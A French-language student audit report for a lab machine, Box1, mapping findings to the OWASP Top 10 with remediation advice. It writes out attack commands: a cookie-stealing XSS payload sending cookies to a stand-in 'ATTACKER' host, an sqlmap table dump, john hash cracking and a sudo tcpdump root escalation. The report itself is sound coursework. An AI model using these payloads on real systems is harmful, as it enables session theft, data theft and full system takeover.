
# README — Rapport d'audit de sécurité Web (Box1)

**URF — Informatique — M2SSI**
**Date :** Mardi, 24 Décembre 2024
**Auteur :** DAMBE Lamboni
**Option :** Master 2 SSI
**Module :** Sécurité Web
**Email :** [dlamboni31@gmail.com](mailto:dlamboni31@gmail.com)

---

## THÈME

**RAPPORT D’AUDIT DU BOX1 — Audit Web basé sur les risques OWASP / Top 10**

---

## Sommaire

1. Objectif
2. Résumé exécutif
3. Méthodologie et commandes utilisées
4. Résultats détaillés (vulnérabilités identifiées)
5. Cartographie vers OWASP Top 10
6. Recommandations générales et correctives
7. Preuves & captures (emplacements)
8. Annexes (commandes, fichiers de travail)

---

## 1. Objectif

Réaliser un audit de la machine **Box1** pour :

* identifier les vulnérabilités applicatives et système exposées,
* évaluer leur criticité selon l'impact potentiel,
* proposer des recommandations techniques et organisationnelles pour corriger les failles.

L'objectif opérationnel était d'essayer d'obtenir des droits élevés (operator / root) afin de démontrer l'impact réel des vulnérabilités.

---

## 2. Résumé exécutif

L'audit a mis en évidence plusieurs vulnérabilités critiques affectant l'application web et le système :

* Injection SQL (extraction des bases et dump de la table `users`),
* Politique de mots de passe faible (hash cassés via `john`),
* Cross-Site Scripting (XSS) exploitable depuis un compte utilisateur,
* Vol de session / SSRF-like exploitation via cookies non-`HttpOnly` et upload de reverse-shell,
* Mauvaises permissions sur un script (élévation à `operator`),
* Sudo mal configuré (tcpdump sans mot de passe) permettant élévation à `root`.

Impact : prise complète du système (compte root) démontrée — risque critique.

---

## 3. Méthodologie et commandes utilisées

* **Découverte des services** : `nmap -sV -sC -O 192.168.56.20` (détails des services HTTP et SSH).
* **Énumération web** : `gobuster dir -u http://192.168.56.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`.
* **Test SSL** (port 443 filtré) : `nmap -p 443 -sV --script ssl-cert 192.168.56.20`.
* **Injection & dump SQL** : payload manuel `' or 1=1; -- -`, puis `sqlmap -r sqlmap.txt -D support -T users --dump`.
* **Crackage de hash** : `john --format=raw-md5 --wordlist=../rockyou.txt ../hash.txt`.
* **XSS / vol cookie** : injection de script (`<script>fetch('http://ATTACKER/?cookies='+document.cookie)</script>`), remplacement du cookie d’admin et upload d’un reverse-shell.
* **Escalade par permissions** : suppression/création d'un `www-backup` exécutable exploité par l'utilisateur `operator`.
* **Escalade root via sudoable tcpdump** : utilisation de `-z` avec un fichier temporaire contenant la commande `chpasswd` et exécution `sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root`.

> Tous les tests ont été réalisés sur la machine Box1 fournie dans le cadre du TP, dans un environnement de laboratoire contrôlé.

---

## 4. Résultats détaillés (vulnérabilités identifiées)

Pour chaque entrée : `Vulnérabilité — Criticité — Impact — Recommandation (résumé)`

### 4.1 Injection SQL (SQLi)

* **Criticité :** Critique
* **Impact :** Vol & exfiltration de données (tables, mots de passe, etc.) — compromission complète des comptes.
* **Recommandation :** Utiliser des requêtes préparées (PDO / requêtes paramétrées), validation stricte des entrées, ORM, contrôle d'accès côté serveur.

### 4.2 Politique de mot de passe faible

* **Criticité :** Critique
* **Impact :** Cassage des mots de passe par attaque par dictionnaire / wordlists.
* **Recommandation :** Contraindre mots de passe ≥ 12 caractères, mélange maj/min/chiffres/caractères spéciaux ; stockage par hashing moderne (bcrypt/argon2) et salage.

### 4.3 Cross-Site Scripting (XSS)

* **Criticité :** Critique
* **Impact :** Vol de session, actions en tant qu’utilisateur, pivot vers attaque d’administration.
* **Recommandation :** Assainir les entrées (HTML sanitizer / DOMPurify), encoder les sorties (`htmlspecialchars`), mettre en place CSP.

### 4.4 Vol de session / SSRF-like (cookie non-HttpOnly + upload de shell)

* **Criticité :** Critique
* **Impact :** Usurpation d’identité, prise de session admin, upload et exécution de reverse-shell.
* **Recommandation :** Marquer les cookies `HttpOnly` & `Secure`, valider et restreindre les uploads (type MIME, scan), contrôler l’accès aux endpoints internes.

### 4.5 Élévation de privilèges par permissions sur script (operator)

* **Criticité :** Critique
* **Impact :** Exécution d’un script modifié par un utilisateur non-privilégié — obtention du shell `operator`.
* **Recommandation :** Restreindre droits d’écriture/exécution sur scripts ; appliquer principe du moindre privilège ; surveiller modifications (integrity monitoring).

### 4.6 Élévation à root via sudo mal configuré (tcpdump)

* **Criticité :** Critique
* **Impact :** Contrôle total du système (root), modification de comptes, déploiement d'accès persistants.
* **Recommandation :** Supprimer `NOPASSWD` sur les commandes sensibles, restreindre l’accès sudo à commandes minimales, auditer les règles `sudoers`.

---

## 5. Cartographie vers OWASP Top 10 (synthèse)

* **Injection SQL** → *Injection* (OWASP Top 10)
* **Mots de passe faibles** → *Identification et authentification faibles / gestion des credentials*
* **XSS** → *Cross-Site Scripting (XSS)*
* **Cookie non-HttpOnly / session theft** → *Cross-Site Scripting / Session Management flaws*
* **Upload non restreint / execution** → *Security Misconfiguration / Insecure File Uploads*
* **Escalade locales (permissions/sudo)** → *Vulnérabilités système / Security Misconfiguration*

---

## 6. Recommandations générales & plan d'action priorisé

### Priorité immédiate (corriger dans les 24-72h)

1. Corriger l'injection SQL (utiliser requêtes préparées).
2. Forcer le stockage sécurisé des mots de passe (argon2/bcrypt) et appliquer une politique de mots de passe robustes.
3. Rendre les cookies `HttpOnly` et `Secure`.

### Priorité courte (1–2 semaines)

1. Fixer le XSS (sanitisation + encoding + CSP).
2. Restreindre les uploads et scanner les fichiers.
3. Ajuster les permissions sur les scripts et répertoires sensibles.

### Priorité moyenne (2–6 semaines)

1. Auditer et corriger la configuration sudo (supprimer NOPASSWD).
2. Mettre en place un monitoring / IDS & journaux centralisés.
3. Implémenter l’intégrité des fichiers (tripwire-like).

### Mesures organisationnelles

* Sensibilisation des développeurs aux bonnes pratiques OWASP.
* Revue de code obligatoire pour les fonctions critiques (auth, upload, DB).
* Tests d’intrusion réguliers et pipeline CI intégrant des scans (SAST/DAST).

---

## 7. Preuves & captures (emplacements)

Les captures d'écran et fichiers de dump sont stockés dans le dossier `evidence/` du rapport (ex. `evidence/sql_dump.txt`, `evidence/john_cracked.txt`, `evidence/reverse_shell_capture.png`).

---

## 8. Annexes

### Commandes clés

* `nmap -sV -sC -O 192.168.56.20`
* `gobuster dir -u http://192.168.56.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
* `sqlmap -r sqlmap.txt -D support -T users --dump`
* `john --format=raw-md5 --wordlist=../rockyou.txt ../hash.txt`
* `sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root`

### Références utiles (lecture)

* OWASP: [https://owasp.org/](https://owasp.org/)
* ANSSI: [https://www.ssi.gouv.fr/](https://www.ssi.gouv.fr/)
* CNIL recommandations mots de passe

---

**Fin du README — Rapport d’audit Box1**

*Souhaitez‑vous que je génère une version PDF prête à livrer ou un README formaté pour GitHub (avec dossiers `evidence/` et `scripts/` prêts) ?*
